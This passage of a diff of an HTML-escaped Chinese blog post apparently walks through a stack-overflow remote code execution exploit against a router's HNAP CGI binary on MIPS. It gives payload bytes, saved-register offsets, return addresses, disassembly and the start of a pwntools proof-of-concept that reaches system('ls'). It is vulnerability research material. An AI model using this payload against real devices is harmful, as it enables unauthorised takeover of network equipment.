-&lt;img src=&#34;35.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;可以看到内存起始地址是0x00430EAC，也就是说目标地址在内存的开头部分，这便确认了这个地址大概率不会发生变动。同一设备无论请求多少次，&lt;code&gt;stdin&lt;/code&gt; 都固定在请求地址附近，栈地址则不稳定，不同设备甚至不同进程都可能不同&lt;/p&gt;
-&lt;img src=&#34;36.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;h3 id=&#34;验证-1&#34;&gt;验证
-&lt;/h3&gt;&lt;p&gt;至此流程便明了了，首先根据上面找到的偏移位置，将pc部分填入0x004033E8，将s0部分填入0x00431240，将&lt;code&gt;MARKTEXT&lt;/code&gt;部分改成ls。程序执行后来到system()，再由s0将ls参数传给函数，最终实现system(ls)&lt;/p&gt;
+&lt;img src=&#34;35.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;可以看到内存起始地址是&lt;code&gt;0x00430EAC&lt;/code&gt;，也就是说目标地址在内存的开头部分，这便确认了这个地址大概率不会发生变动&lt;/p&gt;
+&lt;img src=&#34;36.png&#34; style=&#34;width: 100%;&#34; /&gt;
+&lt;h3 id=&#34;异常覆盖问题排查&#34;&gt;异常覆盖问题排查
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;至此流程便明了了，首先根据上面找到的偏移位置，将ra部分填入&lt;code&gt;0x004033E8&lt;/code&gt;，将&lt;code&gt;s0&lt;/code&gt;部分填入&lt;code&gt;0x00431240&lt;/code&gt;，将&lt;code&gt;MARKTEXT&lt;/code&gt;部分改成&lt;code&gt;ls&lt;/code&gt;。程序执行后来到&lt;code&gt;system()&lt;/code&gt;，再由&lt;code&gt;s0&lt;/code&gt;将&lt;code&gt;ls&lt;/code&gt;参数传给函数，最终实现&lt;code&gt;system(ls)&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;soap_body&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;soap:Body&amp;gt;&amp;lt;MARKTAG&amp;gt;ls&amp;lt;/MARKTAG&amp;gt;&amp;lt;/soap:Body&amp;gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;HNAP_AUTH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1100&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x43\x12\x40&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x40\x33\xe8&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;调试后没有按照预期成功溢出，而是出现了一个奇怪的现象，&lt;code&gt;HNAP_AUTH&lt;/code&gt;中的普通字符串能直接覆盖寄存器，改成了类似&lt;code&gt;  \x43\x12\x40&lt;/code&gt;的地址却不行，后来发现是空格的问题，第一个字节是空格时，后续字节便无法正确覆盖&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$s0 = 0x00616161&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$ra = 0x61616161&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$pc = 0x61616160&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;img src=&#34;37.png&#34; style=&#34;width: 100%;&#34; /&gt;
+&lt;blockquote&gt;
+&lt;p&gt;分析代码后得出结论：&lt;code&gt;HNAP_AUTH&lt;/code&gt; 被复制了两次&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;对汇编进行分析：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;strcpy(&amp;amp;v28, DANGER_IVAR);&lt;/code&gt;：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;004028&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;F0&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;addiu&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x470&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;var_40C&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00402928&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;move&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0040292&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;la&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00402934&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;move&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s4&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;strcpy&lt;/code&gt;的&lt;code&gt;$a0&lt;/code&gt;是目标地址，所以&lt;code&gt;$s2&lt;/code&gt;就是&lt;code&gt;v28&lt;/code&gt;。IDA栈帧中&lt;code&gt;var_40C = -0x40C&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;v28 = sp + 0x470 - 0x40C = sp + 0x64&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;strcpy((char *)v26, v19);&lt;/code&gt;：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00402958&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;addiu&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x470&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;var_44C&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0040295&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;move&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s7&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00402960&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;la&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00402964&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;jalr&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t9&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00402968&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;move&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt;       
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;$s7&lt;/code&gt;就是&lt;code&gt;v26&lt;/code&gt;。IDA栈帧中&lt;code&gt;var_44C = -0x44C&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;v26 = sp + 0x470 - 0x44C = sp + 0x24&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;strcpy(v28, HNAP_AUTH);     // 完整输入，起点v28 = sp+0x64
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;v19 = strtok(v28, &amp;#34; &amp;#34;);     // 遇到空格，把空格改成\x00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;strcpy(v26, v19);           // 只复制第一个空格前的部分，起点 v26 = sp+0x24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;v26&lt;/code&gt; 比 &lt;code&gt;v28&lt;/code&gt; 低 &lt;code&gt;0x40&lt;/code&gt;也就是&lt;code&gt;64&lt;/code&gt;字节，因此同一段数据走两条路径时，到达保存寄存器的偏移不同&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;保存的&lt;code&gt;s0 = v28 + 1036 = v26 + 1100&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;保存的&lt;code&gt;ra = v28 + 1072 = v26 + 1136&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;计算偏移时，&lt;code&gt;HNAP_AUTH = cyclic(2000) + b&amp;quot;  aaa&amp;quot;&lt;/code&gt;，空格位于&lt;code&gt;2000&lt;/code&gt;字节后，&lt;code&gt;2000&lt;/code&gt;个字节远大于&lt;code&gt;1136&lt;/code&gt;，因此&lt;code&gt;strtok&lt;/code&gt;得到的字符串仍然是完整的 &lt;code&gt;cyclic(2000)&lt;/code&gt;，两次会依次写入同一片寄存器区域。第一次&lt;code&gt;v28&lt;/code&gt;写入的会被第二次&lt;code&gt;v26&lt;/code&gt;写入的覆盖，得到的自然是&lt;code&gt;v26&lt;/code&gt;计算出来的偏移&lt;/p&gt;
+&lt;p&gt;后续改成了&lt;code&gt;b&amp;quot;a&amp;quot; * 1100 + b&amp;quot; \x43\x12\x40&amp;quot; + b&amp;quot;b&amp;quot; * 32 + b&amp;quot; \x40\x33\xe8&amp;quot;&lt;/code&gt; ，这里的空格在第&lt;code&gt;1100&lt;/code&gt;字节，第一次&lt;code&gt;v28&lt;/code&gt;写入时两个地址分别在&lt;code&gt;v28 + 1100&lt;/code&gt;和&lt;code&gt;v28+1136&lt;/code&gt;，原本的目标位置则是&lt;code&gt;aaaa&lt;/code&gt;。&lt;code&gt;strcpy(v26, v19)&lt;/code&gt; 后，&lt;code&gt;v26&lt;/code&gt;只剩下&lt;code&gt;1100&lt;/code&gt;个&lt;code&gt;a&lt;/code&gt;，写入后会在结尾再写一个 &lt;code&gt;\x00&lt;/code&gt;，而结尾第&lt;code&gt;1101&lt;/code&gt;字节正是&lt;code&gt;s0&lt;/code&gt;的开头，因此&lt;code&gt;s0&lt;/code&gt;变成了&lt;code&gt;0x00616161&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;正确思路是让初始的 &lt;code&gt;strcpy(v28, HNAP_AUTH)&lt;/code&gt;负责写&lt;code&gt;$s0&lt;/code&gt;和&lt;code&gt;$ra&lt;/code&gt;，并让后续 &lt;code&gt;strcpy(v26, v19)&lt;/code&gt; 在到达保存寄存器前停止，也就是将偏移改成&lt;code&gt;v28&lt;/code&gt;对应的偏移&lt;/p&gt;
+&lt;h3 id=&#34;实现栈溢出rce&#34;&gt;实现栈溢出RCE
+&lt;/h3&gt;&lt;p&gt;poc如下：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -423,43 +521,43 @@
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import os
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import subprocess
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from pwn import *
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import os
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;subprocess&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;os.chroot(&amp;#34;.&amp;#34;)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;os.chdir(&amp;#34;/&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chroot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chdir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;soap_body = b&amp;#39;&amp;lt;soap:Body&amp;gt;&amp;lt;MARKTAG&amp;gt;ls&amp;lt;/MARKTAG&amp;gt;&amp;lt;/soap:Body&amp;gt;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;soap_body&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;soap:Body&amp;gt;&amp;lt;MARKTAG&amp;gt;ls&amp;lt;/MARKTAG&amp;gt;&amp;lt;/soap:Body&amp;gt;&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;REQUEST_METHOD=b&amp;#34;POST&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SOAP_ACTION=b&amp;#34;1&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CONTENT_LENGTH=str(len(soap_body)).encode(&amp;#34;ascii&amp;#34;)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;COOKIE=b&amp;#34;uid=&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;REQUEST_METHOD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SOAP_ACTION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
